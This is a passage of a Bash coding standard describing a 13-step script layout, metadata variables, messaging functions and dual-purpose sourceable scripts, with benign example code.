## The 13 Mandatory Steps

### Step 1: Shebang

**First line of every script - specifies the interpreter.**

```bash
#!/bin/bash
```

**Alternatives:**
```bash
#!/usr/bin/bash
```

```bash
#!/usr/bin/env bash
```

Within a module+script program -- one that can be either sourced or executed -- the shebang can be used again to semantically indicate the beginning of the executable part of the file.

**Rationale for `env` approach:**
- Portable across systems where bash may be in different locations
- Respects user's PATH settings
- Standard on modern systems

### Step 2: ShellCheck Directives (if needed)

**Global directives that apply to the entire script.**

```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
#shellcheck disable=SC1091  # Don't follow sourced files
#shellcheck disable=SC2155  # I promise I'll be good.
```

**Always include explanatory comments** for disabled checks.

Only use when necessary - don't disable checks without good reason.

### Step 3: Brief Description Comment

**One-line purpose statement immediately after shebang/directives.**

```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

**Not a full header block** - just a concise description.

### Step 4: `set -euo pipefail`

**Mandatory strict error handling configuration.**

```bash
set -euo pipefail
```

**What this enables:**
- `set -e` - Exit on any command failure
- `set -u` - Exit on undefined variable reference
- `set -o pipefail` - Pipelines fail if any command fails (not just the last)

**This MUST come before any commands** (except shebang/comments/shellcheck).

**Optional Bash >= 5 test**

If a Bash version check is *really* necessary, insert it immediately after `set -euo pipefail`:

```bash
#!/bin/bash
#shellcheck disable=1090
# Backup program for sql databases
set -euo pipefail
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; } # check bash version >= 5

```

Always assume you are working in a Bash 5 environment.

### Step 5: `shopt` Settings

**Strongly recommended shell option settings.**
```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```

    shopt -s inherit_errexit  # Subshells inherit set -e
    shopt -s shift_verbose    # Warn on shift with no arguments
    shopt -s extglob          # Enable extended pattern matching
    shopt -s nullglob         # Empty globs expand to nothing (not literal string)


**Why these specific options:**
- `inherit_errexit` - Prevents subshells from silently continuing after errors
- `shift_verbose` - Catches argument parsing bugs
- `extglob` - Enables powerful pattern matching: `@(pattern)`, `!(pattern)`, etc.
- `nullglob` - Makes empty globs safe (critical for `for file in *.txt` patterns)

### Step 6: Script Metadata

**Standard metadata variables - make readonly together after declaration.**

```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Why these specific variables:**
- `VERSION` - For `--version` flag, logging, compatibility checks
- `SCRIPT_PATH` - Absolute canonical path to script (resolves symlinks)
- `SCRIPT_DIR` - Directory containing script (for relative file access)
- `SCRIPT_NAME` - Script basename (for messages, logging, temp files)

**Why readonly together:** More efficient than individual readonly statements, documents that these are immutable constants.

**Acceptable alternative forms**
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
# parent program location locking, for a specific application with unique namespace
[[ -v ALX_VERSION ]] || {
  declare -xr ALX_VERSION=1.0.0
  #shellcheck disable=SC2155
  declare -xr ALX_PATH=$(realpath -- "${BASH_SOURCE[0]}")
  declare -xr ALX_DIR=${ALX_PATH%/*} ALX_NAME=${ALX_PATH##*/}
}
```

Note:
  - `shellcheck` SC2155 warnings (declare and assign separately...), can be safely ignored when using `realpath` or `readlink`. (If you've got problems with `realpath`, then you have much greater problems elsewhere.)
  - On some BCS compliant systems `realpath` is set up as a builtin, which is 10x faster than using an executable.

### Step 7: Global Variable Declarations

**All global variables declared up front with types.**

```bash
# Configuration variables
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

# Runtime state
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0

# Arrays for accumulation
declare -a INPUT_FILES=()
declare -a WARNINGS=()
```

**Type declarations:**

Always:

- `declare -i` for integers (enables arithmetic context)
- `declare --` for strings (explicit string type)
- `declare -a` for indexed arrays
- `declare -A` for associative arrays

**Why up front:** Makes all globals visible in one place, prevents accidental creation of globals in functions, documents script's state.

### Step 8: Color Definitions (if terminal output)

**Terminal detection and color code definitions.**

```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

Acceptable:

```bash
# Detect terminal capabilities
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1; then
  RED=$(tput setaf 1)
  GREEN=$(tput setaf 2)
  YELLOW=$(tput setaf 3)
  BLUE=$(tput setaf 4)
  BOLD=$(tput bold)
  RESET=$(tput sgr0)
  readonly -- RED GREEN YELLOW BLUE BOLD RESET
else
  # Not a terminal or tput unavailable - no colors
  declare -r RED='' GREEN='' YELLOW='' BLUE='' BOLD='' RESET=''
fi
```

**Why conditional:** Colors only work on terminals - don't use them when output is piped or redirected.

**Skip this step** if your script doesn't use colored output.

### Step 9: Utility Functions

**Messaging and helper functions - lowest level, used by everything else.**

Users should comment out or remove elements that are not required.

```bash
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

# _Core messaging function using FUNCNAME
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

# Verbose output (respects VERBOSE flag)
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
# Info messages
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Warnings (non-fatal)
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Debug output (respects DEBUG flag)
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
# Success messages
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
# Error output (unconditional)
error() { >&2 _msg "$@"; }
# Exit with error
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

For very simple programs with no need for color or verbosity control, user may simplify the standard messaging functions like this:

```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
debug() { >&2 echo "${FUNCNAME[0]}: $*"; }
success() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

User is strongly encouraged to use these function names for logging output, for both consistency, and for when that quick-and-dirty test script of yours evolves into a Magnum Opus, and now you need proper coloured and verbosity controlled message functions, like you should have used straight from the beginning. You're welcome.

**Why these come first:** Business logic needs messaging, validation, and error handling. These utilities must exist before anything calls them.

**Production optimization:** Important: Remove unused functions **after** script is mature (see Section 6 of main standard).

### Step 10: Business Logic Functions

**Core functionality - the actual work of the script.**

```bash
# Check if all required commands are available
check_prerequisites() {
  # This function requires message functions error(), die(), and success()
  local -i missing=0
  local -- cmd

  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing+=1
    fi
  done

  ((missing==0)) || die 1 "Missing $missing required commands"
  success 'All prerequisites satisfied'
}

# Validate configuration
validate_config() {
  # This function requires global var PREFIX, and message functions die() and success()
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist ${PREFIX@Q}"

  success 'Configuration validated'
}

# Install files to target directory
install_files() {
  # This function requires global var DRY_RUN, and message functions info() and success()
  local -- source_dir=$1
  local -- target_dir=$2

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install files from ${source_dir@Q} to ${target_dir@Q}"
    return 0
  fi

  [[ -d "$source_dir" ]] || die 2 "Source directory not found ${source_dir@Q}"
  mkdir -p "$target_dir" || die 1 "Failed to create target directory ${target_dir@Q}"

  cp -r "$source_dir"/* "$target_dir"/ || die 1 'Installation failed'
  success "Installed files to ${target_dir@Q}"
}

# Generate configuration file
generate_config() {
  # This function requires global vars DRY_RUN, PREFIX, and VERSION; and message functions info() and success()
  local -- config_file=$1

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config ${config_file@Q}"
    return 0
  }

  cat > "$config_file" <<EOF
# Generated configuration
PREFIX=$PREFIX
VERSION=$VERSION
INSTALL_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
EOF

  success "Generated config ${config_file@Q}"
}
```

**Organize bottom-up within business logic:**
- Lower-level functions first (validation, file operations)
- Higher-level functions later (orchestration)
- Each function can call functions defined above it

### Step 11: `main()` Function and Options/Argument Parsing

**Required for scripts over ~200 lines - orchestrates everything.**

```bash
main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift
                     PREFIX=$1 ;;

      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;

      -V|--version)  echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -h|--help)     show_help; return 0 ;;

      -[pvqnfVh]*) #shellcheck disable=SC2046 #split up single options
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option ${1@Q}" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done

  # Make configuration readonly after parsing
  readonly -- PREFIX CONFIG_FILE LOG_FILE
  readonly -i VERBOSE DRY_RUN FORCE

  # Execute workflow
  ((DRY_RUN)) && info 'DRY-RUN mode enabled' ||:

  check_prerequisites
  validate_config
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share
  generate_config "$PREFIX"/etc/myapp.conf

  success 'Installation complete'
}
```

**Why main() is required:**
- **Testing** - Can source script and test `main()` with specific arguments
- **Organization** - Single entry point makes execution flow clear
- **Scoping** - Argument parsing can use local variables in main()
- **Debugging** - Easy to add debug hooks before/after main()

**Exception:** Scripts under 100 lines can skip `main()` and run directly.

### Step 12: Script Invocation

**Execute main with all arguments.**

```bash
main "$@"
```

**ALWAYS quote `"$@"`** to preserve argument array properly.

**For small scripts without main():** Just write business logic directly here.

### Step 13: End Marker

**Mandatory final line.**

```bash
#fin
```

OR:

```bash
#end
```

**Why mandatory:**
- Visual confirmation script is complete (not truncated)
- Some editors/tools look for end-of-file marker
- Consistency across all scripts


---

## Complete Example

**For a comprehensive, production-quality installation script demonstrating all 13 steps in action, see BCS010101 (Complete Working Example).**

The example includes:
- All 13 mandatory steps correctly implemented
- Full working code (462 lines)
- Dry-run mode, force mode, argument parsing
- Systemd integration, configuration generation
- Professional help text and error handling

---

## Anti-Patterns

**For common violations of the 13-step layout and their corrections, see BCS010102 (Common Anti-Patterns).**

Covers eight critical anti-patterns:
1. Missing `set -euo pipefail`
2. Variables used before declaration
3. Business logic before utilities
4. No `main()` in large scripts
5. Missing end marker
6. Premature `readonly`
7. Scattered declarations
8. Unprotected sourcing

---

## Edge Cases and Variations

**For special scenarios where the layout may be modified, see BCS010103 (Edge Cases and Variations).**

Covers five edge cases:
1. Tiny scripts (<200 lines) - May skip `main()`
2. Sourced libraries - Skip `set -e`, `main()`, invocation
3. External configuration - Add config sourcing
4. Platform-specific code - Add platform detection
5. Cleanup traps - Add trap handlers

---
## Recommended General Structure of Bash Scripts

Man=Mandatory Opt=Optional Rec=Recommended

### Executable Scripts

| Order | Status | Step | Comments |
|  0 | Man | '^#!shebang' ||
|  1 | Opt | '^#shellcheck' ||
|  2 | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
|  3 | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
|  4 | Opt | Bash 5 version test | (very rarely needed) |
|  5 | Rec | 'shopt'|standard 'shopt' settings|
|  6 | Rec | Script Metadata||
|  7 | Rec | Global Variable Declarations||
|  8 | Rec | Color Definitions | (if terminal output) |
|  9 | Rec | Utility Functions | (including Messaging) |
| 10 | Rec | Business Logic Functions||
| 11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 12 | Rec | 'main "$@"'| Script Invocation|
| 13 | Man | '#end' Marker||

### Module/Library Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  4 | Opt | Bash 5 version test |
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Rec | Business Logic Functions|
| 13 | Man | '#end' Marker|

### Combined Module/Library-Executable Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  3 | Opt | 'set -euo pipefail' |
|  4 | Opt | Bash 5 version test |
|  5 | Opt | 'shopt'|
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Man | Business Logic Functions|
| 14    | Man | `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0` |
| 14.0  | Man | '^#!shebang' ||
| 14.1  | Opt | '^#shellcheck' ||
| 14.2  | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
| 14.3  | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
| 14.4  | Opt | Bash 5 version test | (very rarely needed) |
| 14.5  | Rec | 'shopt'|standard 'shopt' settings|
| 14.6  | Rec | Script Metadata||
| 14.7  | Rec | Global Variable Declarations||
| 14.8  | Rec | Color Definitions | (if terminal output) |
| 14.9  | Rec | Utility Functions | (including Messaging) |
| 14.10 | Rec | Business Logic Functions||
| 14.11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 14.12 | Rec | 'main "$@"'| Script Invocation|
| 14.13 | Man | '#end' Marker||

---

## Summary

**The 13-step layout is strongly recommended** - it's the foundation of all scripts in this coding standard. This structure:

1. **Guarantees safety** - Error handling comes first, nothing runs without it
2. **Ensures consistency** - Every script follows the same pattern
3. **Enables testing** - `main()` function allows sourcing for tests
4. **Prevents errors** - Bottom-up organization means dependencies are always defined before use
5. **Documents intent** - Structure itself tells you what the script does and how it works
6. **Simplifies maintenance** - Know where everything goes, no guessing

**For scripts over 100 lines**, all 13 steps should be done. **For smaller scripts**, steps 11-12 (main function) can be skipped, but all other steps remain required.

**When in doubt**, follow the complete 13-step structure - the benefits far outweigh the minor overhead. Every production script should follow this pattern exactly.

This layout is the result of years of experience and represents best practices for Bash scripting. Deviations from this structure should be rare and well-justified.


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Some scripts are designed to work both as standalone executables and as source libraries that can be loaded into other scripts. For these dual-purpose scripts, `set -euo pipefail` and `shopt` settings must **ONLY** be applied when the script is executed directly, **NOT** when it is sourced.

**Rationale:** When a script is sourced, applying `set -e` or modifying `shopt` settings would alter the calling shell's environment, potentially breaking the caller's error handling or glob behavior. The sourced script should only provide functions and variables without side effects on the caller's shell state.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION=1.0.0
  #shellcheck disable=SC2155
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern breakdown:**

1. **Function definitions first** (lines 4-9)
   - Define all library functions at the top
   - Export with `declare -fx` if needed by subshells
   - Functions become available when sourced

2. **Early return** (line 12)
   - Single line: `[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0`
   - When sourced: functions loaded, then immediate clean exit
   - When executed: test fails, continues to next line
   - Using `!=` (not equal) reads more naturally than `==`

3. **Visual separator** (line 14)
   - Clear comment line marks executable section boundary
   - Makes code organization obvious to readers

4. **Set and shopt** (lines 15-16)
   - Only applied when executed (never when sourced)
   - Placed immediately after the separation line

5. **Metadata with guard** (lines 18-24)
   - `if [[ ! -v SCRIPT_VERSION ]]` prevents re-initialization
   - Safe to source multiple times without errors
   - Uses `-v` to test if variable is set

**Alternative pattern (if/else block):**

For scripts requiring different initialization in each mode:
```bash
#!/bin/bash

# Functions first
process_data() { ... }
declare -fx process_data

# Dual-mode initialization
if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  declare -r DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  declare -r DATA_DIR=${DATA_DIR:-/tmp/test_data}
  # Export functions, return to caller
fi
```

**Key principles:**
- **Prefer early return pattern** for simplicity and clarity
- Place all function definitions **before** the sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata initialization with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` (execute) and `source script.sh` (source)

**Real-world examples:**
- The `bash-coding-standard` script in this repository
- The `getbcscode.sh` script provides `get_BCS_code_from_rule_filename()` function

**Common use cases:**
- Utility libraries that can also demonstrate usage when executed
- Scripts that provide reusable functions plus a CLI interface
- Test frameworks that can be sourced for functions or run for tests


---


**Rule: BCS0102**

## Shebang and Initial Setup
First lines of all scripts must include a `#!shebang`, global `#shellcheck` definitions (optional), a brief description of the script, and first command `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**

1. `#!/bin/bash` - **Most portable**, works on most Linux systems
   - Use when: Script will run on known Linux systems with bash in standard location

2. `#!/usr/bin/bash` - **FreeBSD/BSD systems**
   - Use when: Targeting BSD systems where bash is in /usr/bin

3. `#!/usr/bin/env bash` - **Maximum portability**
   - Use when: Bash location varies (different systems, development environments)
   - Searches PATH for bash, works across diverse environments

**Rationale:** These three shebangs cover all common scenarios while maintaining compatibility. The first command must be `set -euo pipefail` to enable strict error handling immediately, before any other commands execute.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings and before any other code. Declare them as readonly using `declare -r`.**

**Rationale:**

- **Reliable Path Resolution**: Using `realpath` provides canonical absolute paths and fails early if the script doesn't exist, preventing errors when script is called from different directories
- **Self-Documentation**: VERSION provides clear versioning for deployment and debugging
- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files, libraries, and configuration
- **Logging and Error Messages**: SCRIPT_NAME provides consistent script identification in logs and error output
- **Defensive Programming**: Making metadata readonly prevents accidental modification that could break resource loading
- **Consistency**: Standard metadata variables work the same way across all scripts, reducing cognitive load

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Rest of script follows
```

**Metadata variables explained:**

**1. VERSION**
- **Purpose**: Semantic version of the script
- **Format**: Major.Minor.Patch (e.g., '1.0.0', '2.3.1')
- **Used for**: `--version` output, logging, deployment tracking
- **Example usage**: `echo "$SCRIPT_NAME $VERSION"`

```bash
VERSION=1.0.0

# Display version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Log with version
info "Starting $SCRIPT_NAME $VERSION"
```

**2. SCRIPT_PATH**
- **Purpose**: Absolute canonical path to the script file
- **Resolves**: Symlinks, relative paths, `.` and `..` components
- **Command**: `realpath -- "$0"`
  - `--`: Prevents option injection if filename starts with `-`
  - `"$0"`: Current script name/path
  - **Behavior**: Fails if file doesn't exist (intentional - catches errors early)
  - **Builtin available**: A loadable builtin for realpath is available for maximum performance

```bash
SCRIPT_PATH=$(realpath -- "$0")
# Examples:
# /usr/local/bin/myapp
# /home/user/projects/app/deploy.sh
# /opt/app/bin/processor

# Use for logging script location
debug "Running from ${SCRIPT_PATH@Q}"
```

**3. SCRIPT_DIR**
- **Purpose**: Directory containing the script
- **Derivation**: `${SCRIPT_PATH%/*}` removes last `/` and everything after
- **Used for**: Loading companion files, finding resources relative to script

```bash
SCRIPT_DIR=${SCRIPT_PATH%/*}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_DIR=/usr/local/bin

# If SCRIPT_PATH=/home/user/projects/app/bin/deploy.sh
# Then SCRIPT_DIR=/home/user/projects/app/bin

# Load library from same directory
source "$SCRIPT_DIR"/lib/common.sh

# Read configuration from relative path
config_file="$SCRIPT_DIR"/../conf/app.conf
```

**4. SCRIPT_NAME**
- **Purpose**: Base name of the script (filename only, no path)
- **Derivation**: `${SCRIPT_PATH##*/}` removes everything up to last `/`
- **Used for**: Error messages, logging, `--help` output

```bash
SCRIPT_NAME=${SCRIPT_PATH##*/}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_NAME=myapp

# If SCRIPT_PATH=/home/user/deploy.sh
# Then SCRIPT_NAME=deploy.sh

# Use in error messages
die() { (($# < 2)) || >&2 echo "$SCRIPT_NAME: error: ${*:2}"; exit "${1:-0}"; }

# Use in help text
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE

Process FILE according to configured rules.
EOF
}
```

**Why declare -r for metadata:**

```bash
# ✓ Correct - declare as readonly immediately
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# This pattern:
# 1. Makes each variable immediately immutable at declaration
# 2. Clear, concise single-line declarations
# 3. SCRIPT_DIR and SCRIPT_NAME combined (both derived from SCRIPT_PATH)
# 4. SC2155 disable documents intentional command substitution in declare -r
```

**Using metadata for resource location:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Load libraries relative to script location
source "$SCRIPT_DIR"/lib/logging.sh
source "$SCRIPT_DIR"/lib/validation.sh

# Load configuration
declare -- config_file="$SCRIPT_DIR"/../etc/app.conf
[[ -f "$config_file" ]] && source "$config_file" ||:

# Access data files
declare -- data_dir="$SCRIPT_DIR"/../share/data
[[ -d "$data_dir" ]] || die 2 "Data directory not found ${data_dir@Q}"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
debug "Script location: ${SCRIPT_PATH@Q}"
debug "Config: $config_file"
```

**Edge case: Script in root directory**

```bash
# If script is /myscript (in root directory)
SCRIPT_PATH=/myscript
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution: Handle this edge case if script might be in /
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -n "$SCRIPT_DIR" ]] || SCRIPT_DIR='/'
readonly -- SCRIPT_DIR

# Or use dirname (less portable)
SCRIPT_DIR=$(dirname -- "$SCRIPT_PATH")
```

**Edge case: Sourced vs executed**

```bash
# When script is sourced, $0 is the calling shell, not the script
# To detect if sourced:
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  SCRIPT_PATH=$(realpath -- "$0")
fi

SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Why realpath over readlink:**

```bash
# realpath is the canonical BCS approach because:
# 1. Simpler syntax: No need for -e and -n flags (default behavior is correct)
# 2. Builtin available: Loadable builtin provides maximum performance
# 3. Widely available: Standard on modern Linux systems
# 4. POSIX compliant: realpath is in POSIX, readlink is GNU-specific
# 5. Consistent behavior: realpath fails if file doesn't exist (catches errors early)

# ✓ Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✓ Acceptable, but usually prefer realpath - readlink requires -en flags (more complex, GNU-specific)
SCRIPT_PATH=$(readlink -en -- "$0")

# Note: realpath without -m will fail if file doesn't exist
# This is INTENTIONAL - we want to catch missing scripts early
# If you need to allow missing files, use: realpath -m -- "$0"
# (But for SCRIPT_PATH, we always want existing files)

# For maximum performance, load realpath as builtin:
# enable -f /usr/local/lib/bash-builtins/realpath.so realpath
```

**About shellcheck SC2155:**

```bash
# shellcheck SC2155 warns about command substitution in declare -r
# This is because it masks the return value of the command:

declare -r SCRIPT_PATH=$(realpath -- "$0")
#shellcheck disable=SC2155

# Why we disable SC2155 for SCRIPT_PATH:
# 1. realpath failure is acceptable here - we WANT the script to fail early
#    if the script file doesn't exist
# 2. The metadata variables are set exactly once at script startup
# 3. The command substitution is simple and well-understood
# 4. The pattern is concise and immediately makes the variable readonly

# Alternative (avoiding SC2155) would be more verbose:
SCRIPT_PATH=$(realpath -- "$0") || die 1 'Failed to resolve script path'
declare -r SCRIPT_PATH

# We choose the concise pattern with documented disable directive
# because the failure mode (script doesn't exist) should cause immediate
# script termination anyway.
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using $0 directly without realpath or readlink
SCRIPT_PATH="$0"  # Could be relative path or symlink!

# ✓ Correct - resolve with realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Wrong - using dirname and basename (requires external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - use parameter expansion (faster, more reliable)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR=$PWD  # Wrong! This is current working directory, not script location

# ✓ Correct - derive from SCRIPT_PATH
SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - making readonly individually
readonly VERSION=1.0.0
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

# ✓ Correct - declare as readonly immediately
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - no VERSION variable
# Every script should have a version for tracking

# ✓ Correct - include VERSION
VERSION=1.0.0

# ✗ Wrong - using inconsistent variable names
SCRIPT_VERSION=1.0.0  # Should be VERSION
SCRIPT_DIRECTORY="$SCRIPT_DIR"  # Redundant
MY_SCRIPT_PATH="$SCRIPT_PATH"  # Non-standard

# ✓ Correct - use standard names
VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - declaring metadata late in script
# ... 50 lines of code ...
VERSION=1.0.0  # Too late! Should be near top

# ✓ Correct - declare immediately after shopt
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
VERSION=1.0.0  # Right after shopt
```

**Complete example with metadata usage:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global variables
declare -- LOG_FILE="$SCRIPT_DIR"/../logs/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/../etc/"$SCRIPT_NAME".conf

# Messaging functions
info() {
  echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"
}

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"
}

